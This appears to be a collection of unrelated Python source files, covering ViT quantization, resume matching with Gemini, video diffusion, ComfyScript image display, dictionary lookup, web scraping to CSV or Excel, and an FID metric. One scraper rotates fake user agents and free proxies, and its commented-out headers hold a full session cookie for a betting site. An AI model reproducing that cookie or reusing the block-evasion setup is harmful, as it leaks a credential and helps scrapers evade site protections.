    "import sys\nsys.path.insert(0,'..')\nsys.path.insert(0,'.')\nfrom example.test_vit import *\nimport utils.net_wrap as net_wrap\nimport utils.datasets as datasets\nimport utils.integer as integer\nfrom utils.quant_calib import HessianQuantCalibrator\n\nfrom itertools import product\n\ndef get_int_weights(name, config_name):\n    quant_cfg = init_config(config_name)\n\n    net = get_net(name)\n\n    wrapped_modules=net_wrap.wrap_modules_in_net(net,quant_cfg)\n    \n    g=datasets.ViTImageNetLoaderGenerator('/datasets/imagenet','imagenet',32,32,16, kwargs={\"model\":net})\n    test_loader=g.test_loader()\n    calib_loader=g.calib_loader(num=32)\n    \n    quant_calibrator = HessianQuantCalibrator(net,wrapped_modules,calib_loader,sequential=False,batch_size=4) # 16 is too big for ViT-L-16\n    quant_calibrator.batching_quant_calib()\n\n    int_weights = integer.get_model_int_weight(wrapped_modules)\n    torch.save(int_weights, f\"./int_weights/{name}.pth\")\n\n\nif __name__ == \"__main__\":\n    args = parse_args()\n\n    names = [\n        # \"vit_tiny_patch16_224\",\n        # \"vit_small_patch32_224\",\n        # \"vit_small_patch16_224\",\n        # \"vit_base_patch16_224\",\n        \"vit_base_patch16_384\",\n\n        # \"deit_tiny_patch16_224\",\n        # \"deit_small_patch16_224\",\n        # \"deit_base_patch16_224\",\n        # \"deit_base_patch16_384\",\n\n        # \"swin_tiny_patch4_window7_224\",\n        # \"swin_small_patch4_window7_224\",\n        # \"swin_base_patch4_window7_224\",\n        # \"swin_base_patch4_window12_384\",\n        ]\n    config_names = [\"PTQ4ViT\", \"BasePTQ\"]\n\n    cfg_list = []\n    for name, config in product(names, config_names):\n        cfg_list.append({\"name\":name, \"config_name\":config})\n    \n    if args.multiprocess:\n        multiprocess(get_int_weights, cfg_list, n_gpu=args.n_gpu)\n    else:\n        for cfg in cfg_list:\n            get_int_weights(**cfg)",
    "import re\nimport csv\n\n\n# Remove all non-alphabetic characters from a string\ndef clean_text(text):\n    return re.sub(r\"[^a-zA-Z ]+\", \"\", text).strip()\n\n\n# Remove all non-numeric characters from a string\ndef clean_number(num_text):\n    return re.sub(r\"[^0-9]+\", \"\", num_text).strip()\n\n\ndef save_universities_to_csv(filename, universities):\n    with open(filename, \"w\", newline=\"\", encoding=\"utf-8\") as csvfile:\n        writer = csv.writer(csvfile)\n        writer.writerow(\n            [\n                \"University Rank\",\n                \"University Name\",\n                \"Professor Name\",\n                \"Home Page\",\n                \"Google Scholar\",\n            ]\n        )\n\n        for university in universities:\n            for professor in university.get(\"professors\", []):\n                writer.writerow(\n                    [\n                        university.get(\"rank\", \"\"),\n                        university.get(\"name\", \"\"),\n                        professor.get(\"name\", \"\"),\n                        professor.get(\"home_page\", \"\"),\n                        professor.get(\"google_scholar\", \"\"),\n                    ]\n                )\n\n\ndef load_universities_to_csv(filename, school_filter=None):\n    prof_items = []\n\n    with open(filename, \"r\", encoding=\"utf-8\") as csvfile:\n        reader = csv.DictReader(csvfile)\n        for row in reader:\n            if school_filter and row[\"University Name\"] not in school_filter:\n                continue\n\n            prof_items.append(\n                {\n                    \"school\": row[\"University Name\"],\n                    \"name\": row[\"Professor Name\"],\n                    \"home_page\": row[\"Home Page\"],\n                    \"google_scholar\": row[\"Google Scholar\"],\n                }\n            )\n\n    return prof_items\n\n\ndef save_relevant_professors_to_csv(filename, data):\n    with open(filename, \"w\", newline=\"\", encoding=\"utf-8\") as csvfile:\n        writer = csv.writer(csvfile)\n        writer.writerow(\n            [\n                \"University Name\",\n                \"Professor Name\",\n                \"Home Page\",\n                \"Google Scholar\",\n                \"Overall Relevance\",\n                \"Recent Relevant Highlights Count\",\n                \"Recent Relevant Highlights\",\n            ]\n        )\n\n        for prof in data:\n            writer.writerow(\n                [\n                    prof[\"school\"],\n                    prof[\"name\"],\n                    prof[\"home_page\"],\n                    prof[\"google_scholar\"],\n                    prof[\"relevance\"],\n                    prof[\"recent_highlights_num\"],\n                    prof[\"recent_highlights\"],\n                ]\n            )\n",
    "import streamlit as st\r\nimport google.generativeai as genai\r\nimport os\r\nimport PyPDF2 as pdf\r\nfrom dotenv import load_dotenv\r\nimport time\r\n\r\nload_dotenv() ## load all our environment variables\r\n\r\ngenai.configure(api_key=os.getenv(\"GOOGLE_API_KEY\"))\r\n\r\n# function to instantiate model and get response\r\ndef get_gemini_response(input):\r\n    model = genai.GenerativeModel(\"gemini-pro\")\r\n    response = model.generate_content(input)\r\n    return response.text\r\n\r\n# function to extract text from pdf\r\ndef input_pdf_text(uploaded_file):\r\n    reader = pdf.PdfReader(uploaded_file)\r\n    text = \"\"\r\n    for page_n in range(len(reader.pages)):\r\n        page = reader.pages[page_n]\r\n        text += str(page.extract_text())\r\n    \r\n    return text\r\n\r\n# Prompt template\r\n\r\ninput_prompt = \"\"\"\r\nHey act like a skilled or very experienced ATS (Application Tracking System)\r\nwith a deep understanding of tech field, software engineering, data science, data analyst\r\nand bit data engineer. Your task is to evaluate the resume based on the given job description.\r\nYou must consider the job market is very competitive and you should provide best assistance\r\nfor improving the resumes. Assign the percentage matching based on JD (Job Description)\r\nand the missing keywords with high accuracy.\r\n\r\nI want the response in json structure like\r\n{\r\n    \"JD Match\": \"%\",\r\n    \"Missing Keywords\": [],\r\n    \"Profile Summary\": \"\"\r\n}\r\n\"\"\"\r\n\r\n# Streamlit app\r\nst.title(\"Smart Resume Tracking System\")\r\nst.subheader(\"Compare your Resume with Job Description\")\r\njd = st.text_area(\"Paste the Job Description\")\r\nuploaded_file = st.file_uploader(\"Upload your Resume\", type=\"pdf\", help=\"Please upload the pdf\")\r\n\r\nsubmit = st.button(\"Submit\")\r\n\r\nif submit:\r\n    if uploaded_file:\r\n        text = input_pdf_text(uploaded_file)\r\n        response=get_gemini_response([input_prompt, \"Job Description\\n\" + jd, \"Resume \\n\" + text])\r\n        bar = st.progress(50)\r\n        time.sleep(3)\r\n        bar.progress(100)\r\n        st.json(response)\r\n        \r\n",
    "from __future__ import annotations\nimport asyncio\nimport io\nimport math\nfrom PIL import Image\nimport aiohttp\n\nfrom . import Result\n\nclass ImageBatchResult(Result):\n    # TODO: Lazy cell\n    async def _get_image(self, image: dict) -> Image.Image | None:\n        async with aiohttp.ClientSession() as session:\n            async with session.get(f'{client.endpoint}view', params=image) as response:\n                if response.status == 200:\n                    return Image.open(io.BytesIO(await response.read()))\n                else:\n                    print(f'ComfyScript: Failed to get image: {await client.response_to_str(response)}')\n                    return\n    \n    def __await__(self) -> list[Image.Image | None]:\n        async def f(self):\n            return [await self._get_image(image) for image in self._output['images']]\n        return f(self).__await__()\n    \n    def wait(self) -> list[Image.Image | None]:\n        return asyncio.run(self)\n    \n    async def get(self, i: int) -> Image.Image | None:\n        return await self._get_image(self._output['images'][i])\n    \n    def __getitem__(self, i: int) -> Image.Image | None:\n        return asyncio.run(self.get(i))\n    \n    def display(self, rows: int | None = 1, cols: int | None = None, height: int | None = None, width: int | None = None, **kwds):\n        Images(self).display(rows, cols, height, width, **kwds)\n\n    def _ipython_display_(self):\n        self.display()\n\nclass Images:\n    '''Used to display multiple images in Jupyter Notebook.'''\n\n    def __init__(self, *images: NodeOutput | ImageBatchResult):\n        self.images = images\n\n    async def _display(self, rows: int | None = 1, cols: int | None = None, height: int | None = None, width: int | None = None, **kwds):\n        # TODO: Partial display\n        images = []\n        for image in self.images:\n            if isinstance(image, NodeOutput):\n                image = await image\n            if isinstance(image, ImageBatchResult):\n                images.extend(await image)\n        images = [img for img in images if img is not None]\n        if not images:\n            return\n        \n        from IPython.display import display\n        \n        # Not use HTML if there is only one image or one column\n        if height is None and width is None:\n            if len(images) == 1:\n                display(images[0])\n                return\n            if cols == 1:\n                display(*images)\n                return\n        \n        import ipywidgets as widgets\n\n        first_image = images[0]\n\n        if rows is None:\n            rows = math.ceil(len(images) / cols)\n        elif cols is None:\n            cols = math.ceil(len(images) / rows)\n\n        if height is not None:\n            if width is None:\n                width = int(height * first_image.width / first_image.height)\n            kwds['height'] = f'{(height + 2) * rows}px'\n        if width is not None:\n            kwds['width'] = f'{(width + 2) * cols}px'\n        grid = widgets.GridspecLayout(rows, cols, **kwds)\n        for i in range(rows):\n            for j in range(cols):\n                k = i * cols + j\n                if k < len(images):\n                    kwds = {}\n                    if height is not None:\n                        kwds['height'] = height\n                    if width is not None:\n                        kwds['width'] = width\n                    image = widgets.Image(value=images[k]._repr_png_(), **kwds)\n                    image.add_class('comfy-script-image')\n                    grid[i, j] = image\n\n        # https://github.com/microsoft/vscode-jupyter/issues/7161\n        display(widgets.HBox(children=[widgets.HTML('''<style>\n.cell-output-ipywidget-background {\nbackground-color: transparent !important;\n}\n:root {\n--jp-widgets-color: var(--vscode-editor-foreground);\n--jp-widgets-font-size: var(--vscode-editor-font-size);\n}\n.comfy-script-image {\npadding: 2px;\n}</style>'''), grid]))\n        \n    def display(self, rows: int | None = 1, cols: int | None = None, height: int | None = None, width: int | None = None, **kwds):\n        asyncio.run(self._display(rows, cols, height, width, **kwds))\n    \n    def _ipython_display_(self):\n        self.display()\n\nfrom ... import client\nfrom ..data import NodeOutput\n\n__all__ = [\n    'ImageBatchResult',\n    'Images',\n]",
    "import os\nimport cv2\nimport torch\nimport argparse\nfrom diffusers import StableVideoDiffusionPipeline\nfrom diffusers.utils import export_to_video, load_image\n\ndef extract_last_frame(video_path, iteration, path):\n    video = cv2.VideoCapture(video_path)\n    total_frames = int(video.get(cv2.CAP_PROP_FRAME_COUNT))\n    frame_to_capture = total_frames - 1\n    video.set(cv2.CAP_PROP_POS_FRAMES, frame_to_capture)\n    ret, frame = video.read()\n    if ret:\n        image_path = path + 'frame_part' + str(iteration + 1) + '.jpg'\n        cv2.imwrite(image_path, frame)\n        print(\"Last frame saved at:\", image_path)\n    else:\n        print(\"Failed to extract last frame\")\n    video.release()\n\ndef trim_last_frame(video_path):\n    cap = cv2.VideoCapture(video_path)\n    if not cap.isOpened():\n        print(f\"Unable to open video file: {video_path}\")\n        return None\n    \n    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\n    if frame_count < 2:\n        print(f\"Not enough video frames: {video_path}\")\n        return None\n    \n    frames = []\n    for _ in range(frame_count - 1):\n        ret, frame = cap.read()\n        if not ret:\n            break\n        frames.append(frame)\n    \n    cap.release()\n    return frames\n\ndef concatenate_videos(video_paths, output_path, frame_rate):\n    fourcc = cv2.VideoWriter_fourcc(*'mp4v')\n    video_size = None\n    all_frames = []\n    for video_path in video_paths:\n        frames = trim_last_frame(video_path)\n        if frames is not None:\n            all_frames.extend(frames)\n            if video_size is None:\n                video_size = (frames[0].shape[1], frames[0].shape[0])\n    \n    if len(all_frames) == 0:\n        print(\"No valid video frames\")\n        return\n\n    out = cv2.VideoWriter(output_path, fourcc, frame_rate, video_size)\n    for frame in all_frames:\n        out.write(frame)\n    out.release()\n\ndef inference(meta, args):\n    os.makedirs(meta['foldername'], exist_ok=True)\n    # load pretrained models: t2i: stable diffusion xl; i2v: i2vgen-xl\n\n    pipeline = StableVideoDiffusionPipeline.from_pretrained(\"/home/minkai/video_generation/models/stable-video-diffusion-img2vid-xt-1-1/\", torch_dtype=torch.float16, variant=\"fp16\").to(\"cuda\")\n    generator = torch.manual_seed(args.seed)\n\n    all_video_paths = []\n    for i in range(4):\n        if i == 0:\n            image = load_image(meta['foldername'] + 'people2.png').convert(\"RGB\")\n        else:\n            image = load_image(meta['foldername'] + 'frame_part' + str(i) + '.jpg').convert(\"RGB\")\n        frames = pipeline(image, decode_chunk_size=8, generator=generator, motion_bucket_id=180, noise_aug_strength=0.1).frames[0]\n        save_path = meta['foldername'] + 'generated_part_' + str(i) + '.mp4'\n        all_video_paths.append(save_path)\n        export_to_video(frames, save_path, fps=args.fps)\n        extract_last_frame(save_path, i, meta['foldername'])\n    concatenate_videos(all_video_paths, meta['foldername'] + 'final.mp4', args.fps)\n\n\nif __name__ == \"__main__\":\n    \n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--seed\", type=int, default=1222, help=\"random seed\")\n    parser.add_argument('--test_initial_prompt',action='store_true', help=\"use prompt to generate\")\n    parser.add_argument(\"--fps\", type=int, default=16, help=\"fps of the generated video\")\n    args = parser.parse_args()\n\n    meta = dict(\n                foldername = 'generation/people2_svd/'\n            )   \n\n    inference(meta, args)\n",
    "#tool\nimport requests\nfrom bs4 import BeautifulSoup\nimport time\nimport random\nfrom fake_useragent import UserAgent\nimport json\nimport datetime\nimport threading\n\n# post \u7ffb\u8bd1\nimport hashlib\nimport base64\nfrom Crypto.Cipher import AES  # pip install pycryptodome\nfrom Crypto.Util.Padding import unpad\n\n\n\n\n\nUSER_AGENT_LIST = [\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\",\n    \"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6\",\n    \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6\",\n    \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1\",\n    \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5\",\n    \"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\",\n    \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)\",\n    \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\",\n    \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\",\n    \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3\",\n    \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\",\n    \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\",\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', \n\t'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', \n\t'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', \n\t'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148', \n\t'Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36' \n]\n\nheaders = {'User-Agent': UserAgent().random,\n    #'Cookie':'closeu4883316=%7B%22time%22%3A1674492704670%7D; __utmc=56961525; PHPSESSID=48c481b77957553dd8c89467251abf913fc0fadc; Hm_lpvt_213d524a1d07274f17dfa17b79db318f=1674492390; pm=; LastUrl=; __utma=56961525.1440023439.1674397148.1674485064.1674492388.7; __utmz=56961525.1674397148.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); Hm_lvt_213d524a1d07274f17dfa17b79db318f=1674397150; __bid_n=185d9d8f0f250db83b4207; FPTOKEN=/4F2ptU7OVeG3xjz5snAgvKjXQQz9UqPdL76G/B3jpT1TWQG4z7Tu2yJNxfPDB7hubeh4QdiSH50oOK3vAlyPXixzDbz3qITLfCpwa9v549GVLAhAq5QgjMxAaTPqSKCnt4B0QWWAlWnhMKBnlhk0/n78gNTCPTNjpOia5q40d+gHt0c0n//UKpOqiWURp9gQXT33hRJct4VWxwdjvhpLWNQq9nmF2BiReAGrHwYHkhal0ORMVP+1i9LpJDrwzLT7QSFie+uilyieQzwq29cIbYt53oJKJ3zOzx2OtQHYbE42+UltSZe+kOD0eoRvE1RR8MBSC8y4+b0OJWktNQhljmNtiqKhgE8vVjjR/AQsF0=|QpL0+jz0mPqD/Ug6VFupu2SBREsFXtrzrI8AO312G2s=|10|c97c2e47dd3ae9abce5c2b7a87118c76; FirstOKURL=https%3A//www.okooo.com/soccer/match/1195946/history/; First_Source=www.okooo.com; __utmb=56961525.3.9.1674492393947; LStatus=N; LoginStr=%7B%22welcome%22%3A%22%u60A8%u597D%uFF0C%u6B22%u8FCE%u60A8%22%2C%22login%22%3A%22%u767B%u5F55%22%2C%22register%22%3A%22%u6CE8%u518C%22%2C%22TrustLoginArr%22%3A%7B%22alipay%22%3A%7B%22LoginCn%22%3A%22%u652F%u4ED8%u5B9D%22%7D%2C%22tenpay%22%3A%7B%22LoginCn%22%3A%22%u8D22%u4ED8%u901A%22%7D%2C%22weibo%22%3A%7B%22LoginCn%22%3A%22%u65B0%u6D6A%u5FAE%u535A%22%7D%2C%22renren%22%3A%7B%22LoginCn%22%3A%22%u4EBA%u4EBA%u7F51%22%7D%2C%22baidu%22%3A%7B%22LoginCn%22%3A%22%u767E%u5EA6%22%7D%2C%22snda%22%3A%7B%22LoginCn%22%3A%22%u76DB%u5927%u767B%u5F55%22%7D%7D%2C%22userlevel%22%3A%22%22%2C%22flog%22%3A%22hidden%22%2C%22UserInfo%22%3A%22%22%2C%22loginSession%22%3A%22___GlobalSession%22%7D; acw_tc=2f624a0516744652547357096e5a8cfb2058bee732ba0416eb48b82e110346',\n            }\n\n# \u83b7\u53d6free-proxy-list.net\u4e0a\u7684\u4ee3\u7406 \u4e00\u6574\u9875\u4ee3\u7406\ndef get_free_list():\n    url = 'https://free-proxy-list.net/'\n    response = requests.get(url)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    proxies = []\n    for row in soup.find('table', class_='table table-s",
    "import requests\n\ndef dictionary(word):\n    word = requests.utils.quote(word)\n    api = \"https://api.dictionaryapi.dev/api/v2/entries/en/\" + word\n    response = requests.get(api)\n    data = response.json()\n    \n    try:\n        details = \"--**Word Details**--\\n\"\n        \n        for i in data:\n            details += \"\\n**Word:** \" + i[\"word\"] + \"\\n\"\n            \n            # Pronunciations\n            if (\"phonetics\" in i) and (len(i[\"phonetics\"]) > 0):\n                details += \"\\n**Pronunciation{}\".format(\"s:**\\n\" if (len(i[\"phonetics\"])>1) else \":**\")\n                for phonetic in i[\"phonetics\"]:\n                    details += \"- \"\n                    if \"text\" in phonetic:\n                        if (\"audio\" in phonetic) and (phonetic[\"audio\"] != \"\"):\n                            details += f\"[{phonetic['text']}]({phonetic['audio']})\"\n                        else:\n                            details += f\"{phonetic['text']}\"\n                    elif (\"audio\" in phonetic) and (phonetic[\"audio\"] != \"\"):\n                        details += f\"{phonetic['audio']}\"\n                    details += \"\\n\"\n            \n            # Meanings\n            for meaning in i[\"meanings\"]:\n                details += \"\\n\"\n                details += \"**Part of Speech:** \" + meaning[\"partOfSpeech\"] + \"\\n\"\n                # Definitions\n                for definition in meaning[\"definitions\"]:\n                    details += f\"- Definition: `{definition['definition']}`\\n\"\n                    if \"example\" in definition:\n                        details += f\"  Example: `{definition['example']}`\\n\"\n    \n    except:\n        details = \"No details found for the word.\"\n    return details\n",
    "import os\nimport requests\nfrom lxml import etree\nfrom openpyxl import Workbook\n\n# \u8bfb\u53d6\u94fe\u63a5\u6587\u672c\u6587\u4ef6\nfile_name = \"links.txt\"\nwith open(file_name, \"r\") as file:\n    links = file.read().splitlines()\n\n# \u521b\u5efaExcel\u8868\u683c\nworkbook = Workbook()\nworksheet = workbook.active\n\n# \u5199\u5165\u8868\u5934\nworksheet.append([\"\u6807\u9898\", \"\u5206\u7c7b\", \"\u7b80\u4ecb\", \"\u6807\u7b7e\", \"\u94fe\u63a5\", \"\u63cf\u8ff0\"])\n\n# \u8bbf\u95ee\u6bcf\u4e2a\u94fe\u63a5\u5e76\u63d0\u53d6\u7279\u5b9a\u5185\u5bb9\ntotal_links = len(links)  # \u603b\u94fe\u63a5\u6570\nprocessed_links = 0  # \u5df2\u5904\u7406\u7684\u94fe\u63a5\u6570\nfailed_links = []  # \u5904\u7406\u5931\u8d25\u7684\u94fe\u63a5\nsuccessful_links = []  # \u5904\u7406\u6210\u529f\u7684\u94fe\u63a5\n\nfor link in links:\n    processed_links += 1\n\n    try:\n        response = requests.get(link)\n        html_content = response.text\n\n        # \u4f7f\u7528lxml\u89e3\u6790html\u5185\u5bb9\n        tree = etree.HTML(html_content)\n\n        # \u63d0\u53d6\u6807\u9898\n        title = tree.xpath('//h1[@class=\"site-name h3 my-3\"]/text()')\n        if not title:  # \u68c0\u67e5\u662f\u5426\u5b58\u5728\u6807\u9898\n            failed_links.append(link)\n            continue\n\n        # \u63d0\u53d6\u5206\u7c7b\n        classify = tree.xpath(\"//i[contains(@class, 'iconfont icon-arrow-r-m custom-piece_c')]/following-sibling::a[contains(@class, 'btn-cat')]/text()\")\n\n        # \u63d0\u53d6\u7b80\u4ecb\n        synopsis = tree.xpath('//div[@class=\"mt-2\"]/p[@class=\"mb-2\"]/text()')\n\n        # \u63d0\u53d6\u6807\u7b7e\n        label = tree.xpath('//div[@class=\"mt-2\"]/span[@class=\"mr-2\"]/a/text()')\n\n        # \u63d0\u53d6\u94fe\u63a5{1}\u3010\u6709\u4e9b\u7f51\u7ad9\u4f7f\u7528\u7684\u662f\u5b50\u4e3b\u9898\uff0c\u53ef\u80fd\u6709\u4e9b\u5730\u65b9\u5e76\u4e0d\u662f\u5b8c\u5168\u4e00\u6837\uff0c\u6211\u76ee\u524d\u603b\u7ed3\u4e86\u51e0\u79cd\u65b9\u5f0f\uff0c\u770b\u4f60\u4eec\u559c\u6b22\u7528\u54ea\u4e00\u79cd\uff0c\u76ee\u524d\u6211\u6ca1\u6709\u6ce8\u91ca\u7684\u5c31\u662f\u901a\u7528\u7684\uff0c\u51e0\u4e4e\u4e00\u4e3a\u4e3b\u9898\u90fd\u662f\u9002\u7528\u7684\u3011\n        url = tree.xpath('//span[@class=\"site-go-url\"]//a/@href')\n        response_url = requests.get(url[0])\n        html_content_url = response_url.text\n        # \u4f7f\u7528lxml\u89e3\u6790html\u5185\u5bb9\n        tree_link = etree.HTML(html_content_url)\n        url_links = tree_link.xpath('//meta[@http-equiv=\"refresh\"]/@content')[0].split(\";url=\")[1]\n\n\n        # \u63d0\u53d6\u63cf\u8ff0\n        description = tree.xpath('//div[@class=\"panel-body single my-4 \"]//text()')\n\n        row_data = [title[0] if title else \"\", ', '.join(classify).replace(\" \", \"\"), synopsis[0] if synopsis else \"\", ', '.join(label).replace(\" \", \"\"), url_links if url_links else \"\", ', '.join(description).replace(\" \", \"\")]\n        worksheet.append(row_data)\n\n        successful_links.append(link)\n\n        # \u8f93\u51fa\u5904\u7406\u8fdb\u5ea6\u4fe1\u606f\n        print(f\"\u5df2\u5904\u7406 {processed_links}/{total_links} \u6761\u6570\u636e\")\n\n    except Exception as e:\n        failed_links.append(link)\n        print(f\"\u8bbf\u95ee\u94fe\u63a5\u5931\u8d25\uff1a{link}\")\n        print(str(e))\n        continue\n\n# \u4fdd\u5b58Excel\u8868\u683c\nworkbook.save(\"extracted_data[cs].xlsx\")\n\n# \u8f93\u51fa\u5904\u7406\u7ed3\u679c\nprint(\"\u5904\u7406\u5b8c\u6210\uff01\")\nprint(f\"\u6210\u529f\u5904\u7406 {len(successful_links)}/{processed_links} \u6761\u6570\u636e\")\nprint(f\"\u5904\u7406\u5931\u8d25 {len(failed_links)}/{processed_links} \u6761\u6570\u636e\")\n\n# \u68c0\u67e5\u5e76\u521b\u5efa\u5904\u7406\u6210\u529f\u548c\u5904\u7406\u5931\u8d25\u7684\u94fe\u63a5\u6587\u672c\u6587\u4ef6\nif not os.path.isfile(\"successful_links.txt\"):\n    with open(\"successful_links.txt\", \"w\"):\n        pass\n\nif not os.path.isfile(\"failed_links.txt\"):\n    with open(\"failed_links.txt\", \"w\"):\n        pass\n\n# \u5c06\u5904\u7406\u6210\u529f\u548c\u5904\u7406\u5931\u8d25\u7684\u94fe\u63a5\u4fdd\u5b58\u5230\u6587\u672c\u6587\u4ef6\nwith open(\"successful_links.txt\", \"w\") as file:\n    for link in successful_links:\n        file.write(link + \"\\n\")\n\nwith open(\"failed_links.txt\", \"w\") as file:\n    for link in failed_links:\n        file.write(link + \"\\n\")\n",
    "# Copyright The Lightning team.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nfrom copy import deepcopy\nfrom typing import Any, List, Optional, Sequence, Tuple, Union\n\nimport torch\nfrom torch import Tensor\nfrom torch.nn import Module\nfrom torch.nn.functional import adaptive_avg_pool2d\n\nfrom torchmetrics.metric import Metric\nfrom torchmetrics.utilities.imports import (\n    _MATPLOTLIB_AVAILABLE,\n    _TORCH_FIDELITY_AVAILABLE,\n)\nfrom torchmetrics.utilities.plot import _AX_TYPE, _PLOT_OUT_TYPE\n\nif not _MATPLOTLIB_AVAILABLE:\n    __doctest_skip__ = [\"FrechetInceptionDistance.plot\"]\n\nif _TORCH_FIDELITY_AVAILABLE:\n    from torch_fidelity.feature_extractor_inceptionv3 import (\n        FeatureExtractorInceptionV3 as _FeatureExtractorInceptionV3,\n    )\n    from torch_fidelity.helpers import vassert\n    from torch_fidelity.interpolate_compat_tensorflow import (\n        interpolate_bilinear_2d_like_tensorflow1x,\n    )\nelse:\n\n    class _FeatureExtractorInceptionV3(Module):  # type: ignore[no-redef]\n        pass\n\n    vassert = None\n    interpolate_bilinear_2d_like_tensorflow1x = None\n\n    __doctest_skip__ = [\"FrechetInceptionDistance\", \"FrechetInceptionDistance.plot\"]\n\nfrom abc import ABC, abstractmethod\nimport torchvision.transforms as TF\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nimport sys\n\n\nimport torch.nn as nn\n\n\nclass NoTrainInceptionV3(_FeatureExtractorInceptionV3):\n    \"\"\"Module that never leaves evaluation mode.\"\"\"\n\n    def __init__(\n        self,\n        name: str,\n        features_list: List[str],\n        feature_extractor_weights_path: Optional[str] = None,\n    ) -> None:\n        if not _TORCH_FIDELITY_AVAILABLE:\n            raise ModuleNotFoundError(\n                \"NoTrainInceptionV3 module requires that `Torch-fidelity` is installed.\"\n                \" Either install as `pip install torchmetrics[image]` or `pip install torch-fidelity`.\"\n            )\n        super().__init__(name, features_list, feature_extractor_weights_path)\n        # put into evaluation mode\n        self.eval()\n\n    def train(self, mode: bool) -> \"NoTrainInceptionV3\":\n        \"\"\"Force network to always be in evaluation mode.\"\"\"\n        return super().train(False)\n\n    def forward(self, x: Tensor) -> Tuple[Tensor, ...]:\n        \"\"\"Forward method of inception net.\n\n        Copy of the forward method from this file:\n        https://github.com/toshas/torch-fidelity/blob/master/torch_fidelity/feature_extractor_inceptionv3.py\n        with a single line change regarding the casting of `x` in the beginning.\n\n        Corresponding license file (Apache License, Version 2.0):\n        https://github.com/toshas/torch-fidelity/blob/master/LICENSE.md\n\n        \"\"\"\n        vassert(\n            torch.is_tensor(x) and x.dtype == torch.uint8,\n            \"Expecting image as torch.Tensor with dtype=torch.uint8\",\n        )\n        features = {}\n        remaining_features = self.features_list.copy()\n\n        x = x.to(self._dtype) if hasattr(self, \"_dtype\") else x.to(torch.float)\n        x = interpolate_bilinear_2d_like_tensorflow1x(\n            x,\n            size=(self.INPUT_IMAGE_SIZE, self.INPUT_IMAGE_SIZE),\n            align_corners=False,\n        )\n        x = (x - 128) / 128\n\n        x = self.Conv2d_1a_3x3(x)\n        x = self.Conv2d_2a_3x3(x)\n        x = self.Conv2d_2b_3x3(x)\n        x = self.MaxPool_1(x)\n\n        if \"64\" in remaining_features:\n            features[\"64\"] = (\n                adaptive_avg_pool2d(x, output_size=(1, 1)).squeeze(-1).squeeze(-1)\n            )\n            remaining_features.remove(\"64\")\n            if len(remaining_features) == 0:\n                return tuple(features[a] for a in self.features_list)\n\n        x = self.Conv2d_3b_1x1(x)\n        x = self.Conv2d_4a_3x3(x)\n        x = self.MaxPool_2(x)\n\n        if \"192\" in remaining_features:\n            features[\"192\"] = (\n                adaptive_avg_pool2d(x, output_size=(1, 